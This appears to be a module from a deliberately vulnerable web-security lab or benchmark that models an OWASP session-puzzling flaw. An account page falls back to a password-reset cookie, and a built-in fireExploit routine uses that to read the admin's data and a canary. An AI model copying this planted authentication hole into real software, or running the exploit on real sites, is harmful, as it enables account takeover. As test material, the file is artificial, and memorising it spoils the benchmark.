// WSTG-SESS-08 (4.6.8) — Session Puzzling behaviour.
// Two cookies, ONE handler bug: the account page reads `authed_email` first
// and falls back to `reset_target_email`. The reset form sets the latter.
// Initiating a reset for the admin email puts the admin's email in the
// fallback slot; the account page then renders the admin's data + canary.

import { Scenario } from './scenario.mjs'

const AUTHED_COOKIE = 'authed_email'
const RESET_COOKIE = 'reset_target_email'

function getCookie(req, name) {
  const c = (req.headers.cookie || '').split(';').map(s => s.trim()).find(s => s.startsWith(name + '='))
  return c ? decodeURIComponent(c.slice(name.length + 1)) : null
}

export const classDef = {
  wstgId: 'WSTG-SESS-08',
  class: 'Session Puzzling',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.accountInfoPath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.accountInfoPath),

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.accountInfoPath || reqUrl.pathname === scenario.resetFormPath
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage, manifest }) {
    // ── Password reset flow ─────────────────────────────────────────────
    if (reqUrl.pathname === scenario.resetFormPath) {
      if (req.method === 'GET') {
        return { status: 200, body: renderPage(scenario.resetFormBody) }
      }
      if (req.method === 'POST') {
        const form = new URLSearchParams(helpers.rawBody || '')
        const email = (form.get('email') || '').trim()
        // The reset flow legitimately needs to remember who's resetting — so
        // it stores the target email in a session-shaped cookie. Real bug:
        // the value is set unconditionally, with no check that the email
        // actually belongs to a user the requester can prove they own.
        const headers = {
          Location: scenario.resetFormPath,
          'Set-Cookie': `${RESET_COOKIE}=${encodeURIComponent(email)}; Path=/; SameSite=Lax`,
        }
        return { status: 302, headers, body: '' }
      }
      return { status: 405, body: '' }
    }

    // ── Account info page (the puzzled handler) ─────────────────────────
    if (req.method !== 'GET') return { status: 405, body: '' }
    // VULN: copy-paste — the handler reads authed_email first and falls back
    // to reset_target_email when authed_email isn't present. The two cookies
    // are semantically different, but the fallback treats them as equivalent.
    const sessionEmail = getCookie(req, AUTHED_COOKIE) || getCookie(req, RESET_COOKIE)

    if (sessionEmail && sessionEmail === scenario.adminEmail) {
      return { status: 200, body: renderPage(scenario.adminAccountInfoBody.replaceAll('{CANARY}', manifest.perDeployCanary)) }
    }
    // Empty / unknown — show the help body that leaks the admin email and
    // points the user at the reset flow (the lead that closes the loop).
    const body = scenario.emptyAccountBody
      .replaceAll('{ADMIN_EMAIL}', scenario.adminEmail)
      .replaceAll('{RESET_PATH}', scenario.resetFormPath)
    return { status: 200, body: renderPage(body) }
  },

  // Canonical exploit: POST the reset form with adminEmail (plants the
  // session var), capture the Set-Cookie, GET the account page with it.
  async fireExploit({ baseUrl, scenario }) {
    const resetResp = await fetch(`${baseUrl}${scenario.resetFormPath}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `email=${encodeURIComponent(scenario.adminEmail)}`,
      redirect: 'manual',
    })
    const setCookie = resetResp.headers.get('set-cookie') || ''
    const m = setCookie.match(new RegExp(`${RESET_COOKIE}=([^;]+)`))
    const cookieVal = m ? m[1] : ''
    const r = await fetch(`${baseUrl}${scenario.accountInfoPath}`, {
      headers: { Cookie: `${RESET_COOKIE}=${cookieVal}` },
    })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}
